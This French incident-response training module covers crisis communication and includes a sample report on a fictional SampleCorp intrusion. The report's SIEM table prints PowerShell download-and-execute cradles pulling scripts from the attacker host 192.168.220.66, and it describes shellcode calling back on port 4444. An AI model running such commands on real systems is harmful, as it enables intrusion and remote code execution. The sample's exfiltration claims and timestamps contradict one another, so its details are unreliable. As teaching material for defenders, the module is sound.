Diagrammes du réseau (avant et après l'incident)
Preuves forensic (images disque, vidages de mémoire)
Extraits de code
Liste de contrôle de réponse à l'incident
Archives de communication
Documents de conformité (NDA, formulaires réglementaires)
Glossaire et acronymes
Meilleures Pratiques
Analyse des causes profondes : Identifier la cause fondamentale pour éviter une répétition.
Partage communautaire : Partager des informations non sensibles avec la communauté de la sécurité.
Mises à jour régulières : Informer les parties prenantes tout au long de la réponse à l'incident.
Révision externe : Faire appel à des experts tiers pour valider les conclusions.
Conclusion

Un rapport d'incident est essentiel après un événement de sécurité, offrant une analyse approfondie de ce qui a échoué, des réponses efficaces et des stratégies pour prévenir des événements similaires à l'avenir.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Communications</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80a5-bd1f-dc0784983012"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">La Communication Efficace en Cas de Crise de Sécurité

La communication efficace est indispensable lors d'une crise, en particulier lors d'un incident de sécurité. Une communication transparente, coordonnée et bien structurée soutient la construction de la confiance, la conformité réglementaire et l'efficacité des efforts de réponse.
L'Importance de la Communication Efficace

La valeur d'une communication claire lors d'un incident peut être catégorisée en plusieurs domaines clés :
Confiance des Parties Prenantes

La communication transparente favorise la confiance des parties prenantes. En communiquant rapidement et clairement, une organisation démontre sa responsabilité, sa transparence et son contrôle sur l'incident.
Coordination et Efficacité

Un incident de cybersécurité affecte plus que l’équipe technique ; il a des implications plus larges au sein de l'organisation. Une communication coordonnée assure l'alignement entre toutes les parties prenantes, améliorant ainsi la rapidité et l'efficacité de la réponse.
Conformité Réglementaire

Vérifiez les exigences de conformité spécifiques à votre organisation, qui devraient être documentées dans le Plan de Réponse aux Incidents (PRI). Les directives réglementaires dictent souvent comment, quand et ce qui doit être communiqué pour respecter les exigences légales.
Communication Interne

Les communications internes sont cruciales pour maintenir un message cohérent et constant au sein de l'organisation. Cela est particulièrement important pour éviter les fuites et la désinformation. Les éléments clés des communications internes comprennent :
Notification Immédiate : Informer rapidement toutes les parties prenantes pertinentes dès l'identification de l'incident.
Mises à Jour Régulières : Partager des mises à jour régulières avec les équipes concernées, couvrant l'état de l'incident, les impacts potentiels et les actions en cours.
Boucle de Rétroaction : Établir un canal de rétroaction permettant aux équipes de partager leurs remarques, préoccupations et suggestions.
Communication Externe

Les communications externes doivent être soigneusement planifiées, car elles concernent souvent divers tiers, allant des clients aux régulateurs. Les considérations importantes incluent :
Parties Affected : Communiquer directement avec les individus ou entités affectés, comme les clients, partenaires ou fournisseurs.
Déclaration Publique : En cas d'incidents de grande envergure, envisager de publier une déclaration publique claire et sans jargon technique pour garantir l'accessibilité.
Organismes de Régulation : Notifier les entités réglementaires, telles que la CNIL (Commission Nationale de l'Informatique et des Libertés), si requis par la juridiction ou la loi, dans les délais spécifiés.
Naviguer dans les Canaux de Communication lors d’Incidents de Cybersécurité

Une communication efficace lors d’un incident de cybersécurité nécessite des canaux sécurisés et conformes. Voici un aperçu des considérations techniques et réglementaires pour ces canaux.
Dimensions de Sécurité des Canaux de Communication
Chiffrement : Assurez-vous que toutes les communications sont sécurisées avec un chiffrement de bout en bout, en particulier lors de discussions de détails sensibles.
Authentification et Autorisation : Protégez l'accès aux canaux de communication avec une authentification multi-facteurs stricte (MFA) pour vérifier les identités.
Intégrité des Données : Utilisez des hachages cryptographiques pour garantir que les messages restent inchangés lors de leur transmission.
Communications Éphémères : Pour les discussions très confidentielles, envisagez l'utilisation de plateformes qui suppriment les messages après leur lecture afin de réduire les risques de fuites futures.
Communications Isolées (Air-Gapped) : Si les systèmes de communication principaux sont compromis, utilisez des systèmes isolés qui sont séparés des autres réseaux pour maintenir la sécurité.
Dimensions Réglementaires des Canaux de Communication
Lois sur la Confidentialité des Données : Adhérez aux régulations sur la confidentialité des données, telles que le RGPD (Règlement Général sur la Protection des Données), surtout lorsqu'il s'agit de données personnelles, pour assurer la conformité.
Mandats de Notification des Violations : Suivez les délais et les lignes directrices spécifiques à chaque juridiction concernant la notification des parties prenantes en cas de violation des données.
Conservation des Documents : Trouvez un équilibre entre la messagerie éphémère et les exigences de conservation des documents, car certaines régulations imposent de conserver les communications liées à l'incident.
Communications Transfrontalières : Soyez conscient des lois sur la souveraineté des données qui peuvent affecter les protocoles de communication et le stockage des données si l'incident concerne plusieurs juridictions.
Chaîne de Custodie : Maintenez une chaîne de custodie ininterrompue pour toutes les communications si des procédures légales sont anticipées, afin de garantir que les preuves restent recevables en justice.
Conclusion

La communication efficace est un composant critique de la réponse aux incidents, reliant la coordination interne et les exigences réglementaires. En mettant en œuvre des stratégies de communication sécurisées, bien planifiées et conformes, les organisations peuvent renforcer leur résilience et répondre plus efficacement aux incidents de sécurité.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Real-world Incident Report</strong></summary><div class="indented"><figure class="block-color-gray_background callout" id="1ea25200-7eb4-80bf-898e-deefa4259e07" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><p class="" id="1ea25200-7eb4-8054-9cb3-fd7028a3d734"><strong>Résumé Exécutif</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8041-b7cc-c71bd2b1a3ce"><li style="list-style-type:disc"><strong>ID de l'incident :</strong> INC2019-0422-022</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8076-9087-f3a48135ba06"><li style="list-style-type:disc"><strong>Gravité de l'incident :</strong> Élevée (P2)</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808b-bba2-f77f5bf610b3"><li style="list-style-type:disc"><strong>Statut de l’incident :</strong> Résolu</li></ul><p class="" id="1ea25200-7eb4-80cc-87bd-e710c9e6e55e"><strong>Aperçu de l'incident :</strong></p><p class="" id="1ea25200-7eb4-80b7-9c4c-f989f68c81da">Dans la nuit du 22 avril 2019 à 01:05:00, le Centre des Opérations de Sécurité (SOC) de SampleCorp a détecté une activité non autorisée sur le réseau interne. Celle-ci s’est manifestée par le lancement de processus anormaux et des commandes PowerShell suspectes. Profitant d’un manque de contrôles d’accès réseau robustes et de deux vulnérabilités de sécurité, un acteur malveillant est parvenu à prendre le contrôle des nœuds suivants de l’infrastructure de SampleCorp :</p><ul class="bulleted-list" id="1ea25200-7eb4-80f5-9047-cb6f24222a6d"><li style="list-style-type:disc"><strong>WKST01.samplecorp.com</strong> : système utilisé pour le développement logiciel.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d6-bfb5-f49aa1fc1f52"><li style="list-style-type:disc"><strong>HR01.samplecorp.com</strong> : système dédié au traitement des données des employés et partenaires.</li></ul><p class="" id="1ea25200-7eb4-80e6-a361-d250ed042eba">Le SOC de SampleCorp, en collaboration avec les équipes de Réponse aux Incidents et d’Investigation Numérique (DFIR), a pu contenir la menace, supprimer les logiciels malveillants et corriger les failles de sécurité. Les systèmes compromis ont été restaurés dans leur état initial.</p><p class="" id="1ea25200-7eb4-8046-bf5a-ef39c95673e5"><strong>Constats clés :</strong></p><p class="" id="1ea25200-7eb4-8094-8e50-ea42e0e04352">L’intrus a pu obtenir une adresse IP interne en connectant simplement son ordinateur à un port Ethernet dans un bureau de SampleCorp, en raison de contrôles d’accès réseau insuffisants. L’enquête a révélé que l’entité malveillante a initialement compromis <strong>WKST01.samplecorp.com</strong> via une version vulnérable d’Acrobat Reader, puis a exploité une vulnérabilité de type "buffer overflow" dans une application propriétaire développée par SampleCorp pour étendre son accès. Aucune fuite massive de données n’a été détectée, probablement grâce à l’intervention rapide du SOC et des équipes DFIR. Toutefois, l’accès non autorisé à <strong>WKST01</strong> et <strong>HR01</strong> implique que les données internes et client doivent être considérées comme potentiellement compromises.</p><p class="" id="1ea25200-7eb4-80fb-b540-c975e76ced87"><strong>Actions immédiates :</strong></p><p class="" id="1ea25200-7eb4-801b-8675-cfb87fff00b7">Les équipes SOC et DFIR internes ont géré l’incident sans faire appel à des prestataires externes. Les systèmes compromis ont été isolés par segmentation VLAN. Pour mener une enquête approfondie, un ensemble de données a été collecté, incluant des captures du trafic réseau. Tous les systèmes affectés ont été raccordés à une solution de sécurité hôte, et les journaux d’événements ont été collectés automatiquement via la solution Elastic SIEM existante.</p><p class="" id="1ea25200-7eb4-801c-82dd-c2ea63b1d8e6"><strong>Impact sur les parties prenantes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8056-873c-f6ee19954fb6"><li style="list-style-type:disc"><strong>Clients :</strong><p class="" id="1ea25200-7eb4-80b3-b18a-e787bac309e4">Bien qu’aucune exfiltration massive n’ait été détectée, l’accès non autorisé aux systèmes susmentionnés soulève des inquiétudes quant à l’intégrité et à la confidentialité des données clients. Par mesure de précaution, certains services ont été temporairement mis hors ligne et des clés API ont été révoquées, entraînant de courtes périodes d’indisponibilité. L’impact financier de cette interruption est en cours d’évaluation, avec un risque potentiel de perte de revenus et de confiance client.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ee-994b-ca0b3512ce5c"><li style="list-style-type:disc"><strong>Employés :</strong><p class="" id="1ea25200-7eb4-80ce-a998-c4d8fc3d287f">Le système <strong>HR01.samplecorp.com</strong>, contenant des données sensibles sur les employés, a été compromis. Bien qu’aucune preuve d’une extraction ciblée des données n’ait été trouvée, le risque demeure. Les employés pourraient être exposés à des tentatives de vol d’identité ou de phishing.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80c4-8387-ef23fe1cc5fc"><li style="list-style-type:disc"><strong>Partenaires commerciaux :</strong><p class="" id="1ea25200-7eb4-8008-a4b8-f28bddf97a1b">L’accès à <strong>WKST01.samplecorp.com</strong>, un environnement de développement, laisse supposer que du code propriétaire ou des technologies confidentielles pourraient avoir été exposés. Cela peut impacter la confiance des partenaires commerciaux dans l’exclusivité des solutions technologiques de SampleCorp.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ad-8bc0-e1a768c15a06"><li style="list-style-type:disc"><strong>Organismes de régulation :</strong><p class="" id="1ea25200-7eb4-80ea-8c1b-e41550f666eb">Cette faille de sécurité peut entraîner des conséquences réglementaires. Selon les juridictions concernées et la nature des données compromises, des amendes ou sanctions pourraient être infligées à SampleCorp pour manquement à la protection des données sensibles.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8052-a4ef-e024b03e6122"><li style="list-style-type:disc"><strong>Équipes internes :</strong><p class="" id="1ea25200-7eb4-8071-8734-daaf17450108">Bien que les équipes SOC et DFIR aient efficacement contenu l’incident, celui-ci nécessitera probablement une révision voire une refonte des mesures de sécurité existantes. Cela pourrait entraîner une réallocation des ressources et des ajustements budgétaires, affectant d’autres projets ou départements.</p></li></ul><ul class="bulleted-list" id="1ea25200-7eb4-806a-855a-e4debc2a8b7a"><li style="list-style-type:disc"><strong>Actionnaires :</strong><p class="" id="1ea25200-7eb4-8094-8da5-c706bf395041">À court terme, l’incident pourrait affecter négativement le cours de l’action en raison d’une possible perte de confiance des clients et de potentielles sanctions. À long terme, les impacts dépendront de l’efficacité des mesures correctives mises en place et de la capacité de l’entreprise à restaurer la confiance des parties prenantes.</p></li></ul><p class="" id="1ea25200-7eb4-8048-be9c-e5b74fd3ca23"><strong>Analyse Technique</strong></p><p class="" id="1ea25200-7eb4-8076-afa7-c76e7c241ac4"><strong>Systèmes et Données Affectés</strong></p><p class="" id="1ea25200-7eb4-8031-96c2-e7e77f07c030">En raison d’un manque de contrôles d’accès réseau efficaces, un individu non autorisé a pu obtenir une adresse IP interne simplement en connectant son ordinateur à un port Ethernet dans les locaux de SampleCorp.</p><p class="" id="1ea25200-7eb4-8050-8fd2-c973421a1595">L’entité malveillante est parvenue à prendre le contrôle des systèmes suivants au sein de l’infrastructure de SampleCorp :</p><ul class="bulleted-list" id="1ea25200-7eb4-80fe-9587-f7a800ee38d1"><li style="list-style-type:disc"><strong>WKST01.samplecorp.com</strong> : Environnement de développement contenant du code source propriétaire destiné à de futures versions logicielles, ainsi que des clés API pour des services tiers. L’analyse des accès montre que l’intrus a parcouru plusieurs répertoires, ce qui soulève des inquiétudes quant à un éventuel vol de propriété intellectuelle et à une utilisation abusive des clés API.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8050-b94b-d26e06fc021c"><li style="list-style-type:disc"><strong>HR01.samplecorp.com</strong> : Système de gestion des ressources humaines contenant des données sensibles relatives aux employés et partenaires : informations personnelles, données de paie et évaluations de performance. Les journaux d’activité confirment un accès non autorisé à ce système. Le point le plus préoccupant est l’accès à une base de données non chiffrée contenant les numéros de sécurité sociale et les coordonnées bancaires des employés. Bien qu’aucune preuve d’exfiltration n’ait été détectée, le risque potentiel de vol d’identité et de fraude financière est jugé élevé.</li></ul><p class="" id="1ea25200-7eb4-80f8-abdb-f2b7a41d4802"><strong>Sources et Analyse des Preuves</strong></p><p class="" id="1ea25200-7eb4-8048-8e70-cc488a385209"><strong>WKST01.samplecorp.com</strong></p><p class="" id="1ea25200-7eb4-804e-bff7-c3ecb2c8f02b">Dans la nuit du 22 avril 2019, à 01:05:00 précises, le Centre des Opérations de Sécurité (SOC) de SampleCorp a détecté une activité anormale sur le réseau interne. Cette alerte a été déclenchée par l’observation de relations inhabituelles entre processus parent-enfant et l’exécution de commandes PowerShell suspectes, comme illustré dans une capture d’écran interne.</p><p class="" id="1ea25200-7eb4-8003-bc74-fcca3012f037">L’analyse des journaux révèle que PowerShell a été invoqué via <strong>cmd.exe</strong> pour exécuter le contenu d’un script hébergé à distance. L’adresse IP du serveur distant était <strong>192.168.220.66</strong>, une adresse interne, ce qui indique que l’entité malveillante avait déjà pénétré le réseau interne avant l’exécution du script.<br/><br/></p><p class="" id="1ea25200-7eb4-80b5-ab60-d7ceb7aada52">
</p><figure class="image" id="1ea25200-7eb4-80d9-a9ad-d378fdf604cb"><a href="image%206.png"><img src="image%206.png" style="width:643.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8034-a03d-d79673cd1176">Les premiers signes d'exécution de commandes malveillantes indiquent que <strong>WKST01.samplecorp.com</strong> a probablement été compromis suite à l'ouverture d'une pièce jointe suspecte dans un e-mail, nommée <strong>cv.pdf</strong>, et ce pour les raisons suivantes :</p><ul class="bulleted-list" id="1ea25200-7eb4-8094-a606-c496214c94a9"><li style="list-style-type:disc">L'utilisateur a accédé à sa messagerie via le client <strong>Mozilla Thunderbird</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8025-8979-df658d34e45b"><li style="list-style-type:disc">Le fichier <strong>cv.pdf</strong>, jugé suspect, a été ouvert avec <strong>Adobe Reader 10.0</strong>, une version obsolète présentant des vulnérabilités connues.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80a9-b11f-f806947ffa18"><li style="list-style-type:disc">Des commandes malveillantes ont été enregistrées immédiatement après ces actions, suggérant un lien direct avec l’ouverture du fichier.<figure class="image" id="1ea25200-7eb4-80b6-9a93-f01eca0e3e51"><a href="image%207.png"><img src="image%207.png" style="width:615.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8089-ada5-d19074cf1197">
</p><p class="" id="1ea25200-7eb4-8063-8e7e-e59a6cc6f546">De plus, cmd.exe et powershell.exe ont été générés à partir de wmiprvse.exe.</p><figure class="image" id="1ea25200-7eb4-801c-b264-c52a7990b7b3"><a href="image%208.png"><img src="image%208.png" style="width:615.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-8040-877d-d7402e067269"><a href="image%209.png"><img src="image%209.png" style="width:615.96875px"/></a></figure><p class="" id="1ea25200-7eb4-8057-9377-d1d0345a97b2">Comme déjà mentionné, l’entité non autorisée a ensuite exécuté des commandes PowerShell spécifiques.</p><figure class="image" id="1ea25200-7eb4-8054-a52c-eb488da17b61"><a href="image%2010.png"><img src="image%2010.png" style="width:615.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8084-a835-cb552e037b53"><strong>Analyse succincte de l’adresse IP 192.168.220.66</strong></p><p class="" id="1ea25200-7eb4-8070-826e-dbaafedb1f89">L’analyse des journaux a permis d’identifier quatre hôtes actifs sur le segment réseau, chacun associé à une adresse IP et un nom de machine. L’hôte <strong>192.168.220.66</strong>, précédemment repéré dans les journaux de <strong>WKST01.samplecorp.com</strong>, confirme la présence d’un acteur non autorisé au sein du réseau interne.</p><table class="simple-table" id="1ea25200-7eb4-8012-a942-e3cef02faaab"><tbody><tr id="1ea25200-7eb4-80d4-9d11-cd9e802ac7b4"><td class="" id="?SjM">Adresse IP</td><td class="" id="We&lt;A">Nom d’hôte</td></tr><tr id="1ea25200-7eb4-80d4-8886-d047a9d0211d"><td class="" id="?SjM">192.168.220.20</td><td class="" id="We&lt;A">DC01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-80d7-aae0-c01b3c875cf7"><td class="" id="?SjM">192.168.220.200</td><td class="" id="We&lt;A">WKST01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-8049-ae13-f1c38d2d4a90"><td class="" id="?SjM">192.168.220.101</td><td class="" id="We&lt;A">HR01.samplecorp.com</td></tr><tr id="1ea25200-7eb4-801b-a089-e95ce22d8248"><td class="" id="?SjM">192.168.220.202</td><td class="" id="We&lt;A">ENG01.samplecorp.com</td></tr></tbody></table><p class="" id="1ea25200-7eb4-80f4-8d10-c1c98d7387f1">Le tableau ci-dessous présente les résultats d’une requête SIEM visant à identifier les exécutions de commandes initiées depuis l’adresse <strong>192.168.220.66</strong>, sur la base des journaux collectés à partir de <strong>WKST01.samplecorp.com</strong> :</p><table class="simple-table" id="1ea25200-7eb4-8072-8d09-ebb4ef29e91a"><tbody><tr id="1ea25200-7eb4-8043-8692-c9ad065b9c56"><td class="" id="_?m&lt;">Commande exécutée</td><td class="" id="sXMe">Hôte cible</td><td class="" id="L]\E">Nombre d’occurrences</td></tr><tr id="1ea25200-7eb4-8079-8781-dbf6b18fb3de"><td class="" id="_?m&lt;"><code>cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\1555864304.02 2&gt;&amp;1</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">5</td></tr><tr id="1ea25200-7eb4-80b7-8f99-f90d7c11aebe"><td class="" id="_?m&lt;"><code>cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\1555864304.02 2&gt;&amp;1</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">4</td></tr><tr id="1ea25200-7eb4-8056-8107-dc02dbe8eeae"><td class="" id="_?m&lt;"><code>powershell.exe -nop -w hidden -c $c=new-object net.webclient;...;IEX</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">2</td></tr><tr id="1ea25200-7eb4-80e6-ae48-dfce35183796"><td class="" id="_?m&lt;"><code>whoami</code></td><td class="" id="sXMe">WKST01</td><td class="" id="L]\E">1</td></tr><tr id="1ea25200-7eb4-80fe-b351-d834dff53127"><td class="" id="_?m&lt;"><code>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService;</code></td><td class="" id="sXMe">HR01</td><td class="" id="L]\E">1</td></tr></tbody></table><p class="" id="1ea25200-7eb4-80e8-89cb-c8af9a04ceed">Ces résultats indiquent que l’entité non autorisée a réussi à infiltrer les systèmes <strong>WKST01.samplecorp.com</strong> et <strong>HR01.samplecorp.com</strong>.</p><p class="" id="1ea25200-7eb4-8031-8209-d081e9d5c4c8"><strong>HR01.samplecorp.com</strong></p><p class="" id="1ea25200-7eb4-802e-afe1-f7dd4ccc3d77">Une attention particulière a ensuite été portée à <strong>HR01.samplecorp.com</strong>, car les captures réseau montrent que l’adresse <strong>192.168.220.66</strong> a tenté d’établir une connexion avec ce système dès les premières phases de l’activité malveillante. Cela renforce l’hypothèse d’une compromission planifiée et coordonnée entre plusieurs hôtes internes.</p><figure class="image" id="1ea25200-7eb4-80cc-a1dd-dd64de7aa7d8"><a href="image%2011.png"><img src="image%2011.png" style="width:615.96875px"/></a></figure><p class="" id="1ea25200-7eb4-801d-8522-db483c40a804">Les détails du trafic réseau indiquent une tentative d'exploitation par dépassement de tampon ciblant le service actif sur le port <strong>31337</strong> de <strong>HR01.samplecorp.com</strong>.<br/><br/><br/></p><figure class="image" id="1ea25200-7eb4-8085-953f-eedb2fd73e75"><a href="image%2012.png"><img src="image%2012.png" style="width:615.96875px"/></a></figure></li></ul><p class="" id="1ea25200-7eb4-80f6-b0dc-f86159d56b4a"><br/>Le trafic réseau a été exporté sous forme de binaire brut pour une analyse plus approfondie.<br/><br/></p><figure class="image" id="1ea25200-7eb4-8078-95c9-e7307b81354b"><a href="image%2013.png"><img src="image%2013.png" style="width:643.984375px"/></a></figure><p class="" id="1ea25200-7eb4-8006-805e-cba3214842b9">Le binaire extrait a été analysé dans un débogueur de shellcode, scdbg.</p><p class="" id="1ea25200-7eb4-8088-8dc6-c346149412b5">Scdbg révèle que le shellcode tentera d'établir une connexion à 192.168.220.66 sur le port 4444. Cela confirme une tentative d'exploitation d'un service exécuté sur le port 31337 de <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a>.<br/></p><figure class="image" id="1ea25200-7eb4-8033-ba6f-fd23db188dfa"><a href="image%2014.png"><img src="image%2014.png" style="width:587.984375px"/></a></figure><p class="" id="1ea25200-7eb4-80b6-b28b-fce58365318b">Une recherche de connexions réseau entre <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a> et l'entité non autorisée a été effectuée à l'aide du fichier de capture de trafic susmentionné. Les résultats ont révélé des connexions vers l'entité non autorisée sur le port 4444. Cela indique que l'entité non autorisée a exploité avec succès une vulnérabilité de dépassement de mémoire tampon pour obtenir l'exécution de commandes sur <a href="http://hr01.samplecorp.com/">HR01.samplecorp.com</a>.</p><figure class="image" id="1ea25200-7eb4-80e6-930d-d97c57f2540c"><a href="image%2015.png"><img src="image%2015.png" style="width:587.96875px"/></a></figure><h3 class="" id="1ea25200-7eb4-8004-9e3e-dde6a91b565f"><strong>Adaptation de la profondeur de l’analyse technique</strong></h3><p class="" id="1ea25200-7eb4-80d9-9c8b-f5ba06e90eb4">La profondeur de l’analyse technique peut être ajustée afin de garantir que l’ensemble des parties prenantes soient correctement informées de l’incident et des mesures prises en réponse. Bien que nous ayons volontairement condensé les détails de l’enquête dans ce module afin de ne pas vous submerger, il est important de noter que, dans un contexte réel, chaque affirmation serait étayée par des preuves solides et vérifiables.</p><hr id="1ea25200-7eb4-8099-a292-ca451f5deaa7"/><h3 class="" id="1ea25200-7eb4-80b8-920e-e48ffe25a2f4"><strong>Indicateurs de Compromission (IoCs)</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80ad-b1cd-c0a84372449e"><li style="list-style-type:disc"><strong>Adresse IP de Command &amp; Control (C2)</strong> : 192.168.220.66</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d1-a402-daa83ec68d65"><li style="list-style-type:disc"><strong>Fichier malveillant</strong> : <code>cv.pdf</code><ul class="bulleted-list" id="1ea25200-7eb4-8009-85a6-d6ab0c5de649"><li style="list-style-type:circle"><strong>Empreinte SHA256</strong> : <code>ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011</code></li></ul></li></ul><hr id="1ea25200-7eb4-8055-a9bd-efe0e23b43ad"/><h3 class="" id="1ea25200-7eb4-805a-ba08-fdaddb3f3133"><strong>Analyse des Causes Racines</strong></h3><p class="" id="1ea25200-7eb4-80eb-aac6-ffe3a2b146cd">L'accès non autorisé au réseau interne de SampleCorp a été rendu possible par l'absence de contrôles d’accès réseau adéquats.</p><p class="" id="1ea25200-7eb4-8062-8ee3-d9961e577f79">Deux vulnérabilités majeures ont été identifiées comme causes principales de l’incident :</p><ol class="numbered-list" id="1ea25200-7eb4-80d2-9eac-fc5b490bb530" start="1" type="1"><li><strong>Utilisation d’une version obsolète d’Adobe Acrobat Reader</strong>, connue pour ses failles de sécurité.</li></ol><ol class="numbered-list" id="1ea25200-7eb4-8038-afee-ea80eda9f333" start="2" type="1"><li><strong>Présence d’une vulnérabilité de type dépassement de tampon</strong> dans une application propriétaire.</li></ol><p class="" id="1ea25200-7eb4-80fb-95a2-e3fe63e031bc">Ces failles ont été aggravées par un manque de cloisonnement réseau entre les systèmes critiques, facilitant la propagation de l’attaque. En parallèle, l’absence de formation des utilisateurs face aux techniques de phishing a également été un facteur de compromission.</p><hr id="1ea25200-7eb4-80a2-8b23-f80b6bd5c612"/><h3 class="" id="1ea25200-7eb4-8002-bca8-c32d2ab47867"><strong>Chronologie Technique de l’Incident</strong></h3><h3 class="" id="1ea25200-7eb4-8053-8523-ee150b7dda72"><strong>Compromission initiale</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8065-8439-de416d5e600a"><li style="list-style-type:disc"><strong>22 avril 2019, 00:27:27</strong> : Un employé ouvre le fichier malveillant <code>cv.pdf</code> sur <strong>WKST01.samplecorp.com</strong>, exploitant une vulnérabilité dans une version obsolète d’Acrobat Reader. Cela déclenche l’exécution d’un code malveillant qui permet une première prise de contrôle.</li></ul><h3 class="" id="1ea25200-7eb4-809f-bb20-efe941d10fd8"><strong>Mouvement latéral</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80b7-ba35-c420aa15f16a"><li style="list-style-type:disc"><strong>22 avril 2019, 00:50:18</strong> : L’entité malveillante réalise une reconnaissance du réseau interne. Elle identifie une vulnérabilité de type buffer overflow dans une application RH propriétaire sur <strong>HR01.samplecorp.com</strong> et l’exploite pour accéder à ce système.</li></ul><h3 class="" id="1ea25200-7eb4-80f3-b740-e2a71078bff2"><strong>Accès aux données &amp; exfiltration</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-80ce-ab39-d7e3c3e6255d"><li style="list-style-type:disc"><strong>22 avril 2019, 00:35:09</strong> : L’intrus accède à plusieurs répertoires sur <strong>WKST01</strong> contenant du code source propriétaire et des clés API.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-800a-ab6e-c07c45627bd4"><li style="list-style-type:disc"><strong>22 avril 2019, 01:30:12</strong> : Il découvre une base de données non chiffrée sur <strong>HR01</strong> contenant des données sensibles (NIR, salaires, etc.), qu’il compresse puis exfiltre vers un serveur externe via un tunnel SSH sécurisé.</li></ul><h3 class="" id="1ea25200-7eb4-80db-bb29-d1622d350a2f"><strong>Communications avec le serveur C2</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8003-b7d9-f47706976fee"><li style="list-style-type:disc">L’entité malveillante a obtenu un accès physique au réseau interne. Le serveur de commande et de contrôle (C2) identifié utilisait l’adresse IP interne <strong>192.168.220.66</strong>.</li></ul><h3 class="" id="1ea25200-7eb4-80f6-bece-f9a8fcabea65"><strong>Déploiement ou activité de logiciels malveillants</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8095-a956-d8306d4217f1"><li style="list-style-type:disc">Le malware a été diffusé via un fichier PDF malveillant et a utilisé des binaires Windows légitimes pour l’exécution de commandes et l’exploitation post-compromission.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-807b-a128-d10f60844478"><li style="list-style-type:disc">Du code shell (shellcode) a ensuite été injecté dans le cadre du buffer overflow pour infecter <strong>HR01.samplecorp.com</strong>.</li></ul><hr id="1ea25200-7eb4-80d4-8fd7-e8fcf1b951cf"/><h3 class="" id="1ea25200-7eb4-8098-a6db-d8a9385ddb4c"><strong>Phases de Contention</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8032-8446-e26ef8537337"><li style="list-style-type:disc"><strong>22 avril 2019, 02:30:11</strong> : Les équipes SOC et DFIR isolent immédiatement les machines <strong>WKST01</strong> et <strong>HR01</strong> via segmentation VLAN.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8058-99bd-f97f5fdfcb90"><li style="list-style-type:disc"><strong>03:10:14</strong> : Installation d’une solution de sécurité sur les deux hôtes pour collecter davantage de données.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80d6-b39c-d0c89ea1be49"><li style="list-style-type:disc"><strong>03:43:34</strong> : Mise à jour des règles du pare-feu pour bloquer l’IP C2 identifiée et couper l’accès distant de l’attaquant.</li></ul><hr id="1ea25200-7eb4-80b2-b651-f7c26d48b3ad"/><h3 class="" id="1ea25200-7eb4-80a8-8351-d0be54327de1"><strong>Phases d’Éradication</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-804b-bd49-c42043c45954"><li style="list-style-type:disc"><strong>04:11:00</strong> : Utilisation d’un outil spécialisé de suppression de malware sur <strong>WKST01</strong> et <strong>HR01</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8038-b53f-d50a63b6927c"><li style="list-style-type:disc"><strong>04:30:00</strong> : Mise à jour d’Acrobat Reader sur toutes les machines concernées pour corriger la vulnérabilité initiale.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8059-beb9-f6b6d5e806e5"><li style="list-style-type:disc"><strong>05:01:08</strong> : Révocation des clés API compromises.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8004-9622-d4ea67ba6935"><li style="list-style-type:disc"><strong>05:05:08</strong> : Réinitialisation des identifiants des utilisateurs concernés.</li></ul><hr id="1ea25200-7eb4-8050-9720-e4758602ead2"/><h3 class="" id="1ea25200-7eb4-805e-b1ad-e3af9c386d10"><strong>Phases de Rétablissement</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-8089-a024-d15a02a543f3"><li style="list-style-type:disc"><strong>05:21:20</strong> : Restauration de <strong>WKST01</strong> à partir d’une sauvegarde validée.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80e0-94b4-c300bea78697"><li style="list-style-type:disc"><strong>05:58:50</strong> : Restauration de <strong>HR01</strong> suivant la même procédure.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8037-96a0-f0ce1397a93b"><li 